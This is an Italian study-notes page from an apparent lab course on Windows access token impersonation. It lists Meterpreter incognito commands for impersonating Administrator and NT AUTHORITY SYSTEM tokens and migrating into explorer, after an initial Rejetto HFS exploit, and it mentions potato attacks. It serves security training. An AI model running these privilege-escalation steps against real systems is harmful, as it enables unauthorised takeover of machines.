---
description: Per potersi impossessare dei privilegi dell'utente del token
---

# Access Token Impersonation

<figure><img src="../../.gitbook/assets/image (864).png" alt=""><figcaption></figcaption></figure>

userinit è il processo usato per creare nuovi processi

<figure><img src="../../.gitbook/assets/image (865).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (866).png" alt=""><figcaption></figcaption></figure>

In particolare è utile SeImpersonatePrivilege

<figure><img src="../../.gitbook/assets/image (867).png" alt=""><figcaption></figcaption></figure>

## Ottenere accesso iniziale al target

In questo caso exploiteremo il Rejetto HFS 2.3 come fatto fatto prima

<figure><img src="../../.gitbook/assets/image (868).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (869).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (871).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>

Non abbiamo i permessi per migrare su explorer (64bit) perché abbiamo un utente local service che non è amministrativo, però tra i permessi ha SeImpersonatePrivilege.

## Carichiamo il modulo incognito sul target da meterpreter shell

```
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"  //tra gli elencati dal comando sopra
getuid
getprivs
pgrep explorer
migrate 3512  //ID processo explorer
getprivs
getuid
```

<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>

-u è per specificare i token dell'utente (user option).

* Delegation Tokens: risultato di log-on interattivi
* Impersonation Tokens: risultato di log-on non interattivo

Come Delegation abbiamo Administator che ci darà appunto permessi amministrativi

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (878).png" alt=""><figcaption></figcaption></figure>

### Nel caso in cui non ci siano token utili: Potato Attack

Se ci troviamo in una situaziuone dove non ci sono privileged access token disponibili bisognerà usare un potato attack.Viene generato un NT AUTHORITY\SYSTEM access token o Administrator access token.

### Una volta ottenuto accesso come Administrator possiamo passare anche ad altri token

```
impersonate_token "NT AUTHORITY SYSTEM"
```

<figure><img src="../../.gitbook/assets/image (879).png" alt=""><figcaption></figcaption></figure>

Ad esempio NT AUTHORITY\SYSTEM e possiamo guardare anche i suoi di privilegi:

<figure><img src="../../.gitbook/assets/image (880).png" alt=""><figcaption></figcaption></figure>

